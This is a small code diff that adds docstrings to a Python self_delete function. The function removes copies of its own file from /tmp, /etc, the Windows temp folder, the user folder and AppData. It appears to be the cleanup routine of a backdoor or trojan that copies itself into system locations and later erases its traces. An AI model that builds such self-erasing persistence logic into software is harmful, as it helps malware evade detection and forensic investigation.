@@ -62,7 +62,8 @@ def self_delete():
 	if SYSTEM == 'Linux':
 		try:
 			'''
-			Delete all files from Linux system.
+			Delete all copies of this file from the Linux file
+			system.
 			'''
 			run(['rm', '/tmp/' + FILENAME])
 			run(['rm', '/etc/' + FILENAME])
@@ -73,6 +74,10 @@ def self_delete():
 		return r"Deleted all files..."
 	else:
 		try:
+			'''
+			Delete all copies of this file from the Windows file
+			system.
+			'''
 			run(['del', r'%temp%\\' + FILENAME])
 			run(['del', r'C:\Users\%username%\\' + FILENAME])
 			run(['del', r'C:\Users\%username%\\AppData\\' + FILENAME])
